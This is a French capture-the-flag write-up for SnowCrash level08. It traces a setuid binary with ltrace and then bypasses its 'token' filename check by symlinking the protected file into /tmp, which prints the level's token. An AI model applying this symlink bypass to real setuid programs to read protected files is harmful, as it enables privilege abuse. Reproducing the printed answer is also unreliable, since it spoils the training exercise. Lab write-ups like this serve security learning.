# LEVEL08

**ls -la** : `-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08`

ltrace ./level08 :

```
level08@SnowCrash:~$ ltrace ./level08 
__libc_start_main(0x8048554, 1, 0xbffff7f4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)               = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

ltrace ./level08 token :

```
level08@SnowCrash:~$ ltrace ./level08 token 
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")               = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
) = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

On remarque que le programme vérifie que le fichier ne contient pas "token", il faut donc modifier le nom de celui-ci pour pouvoir le lire.

N'ayant pas les droits d'écritures dans le home, nous ne pouvons pas utiliser les commande `mv`, `cp`, `rename`.

Nous pouvons utiliser la commande `ln -s /home/user/level08/token /tmp/flag08`

Pour créer un lien symbolique, ce qui va nous permettre de créer un raccourci qu'on pourra nommer comme nous le souhaitons.

```
level08@SnowCrash:~$ ./level08 /tmp/flag08
quif5eloekouj29ke0vouxean
```
